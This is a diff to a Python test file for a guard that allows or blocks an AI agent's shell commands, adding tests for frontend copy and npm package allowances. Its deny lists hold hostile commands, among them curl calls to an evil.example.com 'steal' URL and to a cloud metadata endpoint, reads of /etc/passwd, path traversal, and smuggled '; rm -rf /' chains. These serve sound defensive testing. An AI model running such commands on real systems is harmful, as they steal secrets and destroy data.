@@ -286,7 +286,7 @@ class CurlHostRestrictionTests(unittest.TestCase):
             "curl https://evil.example.com/steal",
             "curl http://169.254.169.254/latest/meta-data/",
             "curl https://demoapp.local.evil.com/x",
-            "curl http://user:pw@evil.example.com/x",
+            "curl http://user:pw@evil.example.com/x",  # pragma: allowlist secret
         ):
             ok, _ = check_bash(cmd, allowed_hosts=self.HOSTS)
             self.assertFalse(ok, f"{cmd!r} should be DENIED")
@@ -450,3 +450,84 @@ class FrontendBuildAllowanceTests(unittest.TestCase):
             self.assertFalse(ok, f"{cmd!r} must be denied when not enabled")
             if cmd.startswith(("npm", "npx")):
                 self.assertIn("AGENT_MODE_ALLOW_FRONTEND_BUILD", why)
+
+
+class FrontendDeployAllowanceTests(unittest.TestCase):
+    """The single permitted Bash write: moving the frontend build into the
+    workspace's static dir. `sync_static` only ever reads from
+    <workspace>/static, and the bundle is far too large for the Write tool, so
+    without this the built frontend is never served. Both operands are fixed
+    workspace-relative literals, so there is nothing to point outside the
+    workspace -- everything else must stay denied."""
+
+    ALLOWED = [
+        "cp -r frontend/zango-build/. static/js/",
+        "cp -r frontend/zango-build/ static/js/",
+        "cp -R frontend/zango-build/. static/js/",
+        "cp frontend/zango-build/. static/js",
+    ]
+    DENIED = [
+        # Redirected destination.
+        "cp -r frontend/zango-build/. /tmp/x",
+        "cp -r frontend/zango-build/. ../../etc/",
+        # Redirected source.
+        "cp -r /etc/passwd static/js/",
+        "cp -r ../../../etc static/js/",
+        "cp -r frontend/zango-build/../../etc static/js/",
+        # Other mutating verbs stay denied outright.
+        "mv frontend/zango-build/. static/js/",
+        "rm -rf static/js",
+        "mkdir -p static/js",
+        "cp -r frontend/zango-build/. static/js/ && rm -rf /",
+    ]
+
+    def test_permitted_when_enabled(self):
+        for cmd in self.ALLOWED:
+            ok, why = check_bash(cmd, app_name="X", allow_frontend=True)
+            self.assertTrue(ok, f"{cmd!r} should be allowed, got: {why}")
+
+    def test_denied_even_when_enabled(self):
+        for cmd in self.DENIED:
+            ok, _ = check_bash(cmd, app_name="X", allow_frontend=True)
+            self.assertFalse(ok, f"{cmd!r} must stay denied")
+
+    def test_denied_by_default(self):
+        for cmd in self.ALLOWED:
+            ok, _ = check_bash(cmd, app_name="X")
+            self.assertFalse(ok, f"{cmd!r} must be denied when not enabled")
+
+
+class DesignPackageAllowanceTests(unittest.TestCase):
+    """A polished UI needs a chart library; the scaffold ships none. The guard
+    permits a closed set of design packages by exact name -- `npm install`
+    executes lifecycle scripts, so the package name is the security boundary."""
+
+    def test_allowed_design_packages_install(self):
+        for cmd in (
+            "npm install echarts",
+            "npm i recharts",
+            "npm add date-fns",
+            "npm install echarts echarts-for-react",
+            "npm install echarts@5.5.0",
+            "npm install clsx tailwind-merge",
+        ):
+            ok, reason = check_bash(cmd, allow_frontend=True)
+            self.assertTrue(ok, f"{cmd!r} should be allowed: {reason}")
+
+    def test_arbitrary_packages_still_denied(self):
+        for cmd in (
+            "npm install left-pad",
+            "npm i echarts evil-pkg",       # one bad name poisons the whole call
+            "npm install ../local-evil",
+            "npm install -g echarts",
+            "npm install echarts; rm -rf /",
+            "npm exec echarts",
+            "npm run postinstall",
+        ):
+            ok, _ = check_bash(cmd, allow_frontend=True)
+            self.assertFalse(ok, f"{cmd!r} must stay denied")
+
+    def test_design_packages_need_frontend_enabled(self):
+        ok, reason = check_bash("npm install echarts", allow_frontend=False)
+        self.assertFalse(ok)
+        self.assertIn("Node tooling is disabled", reason)
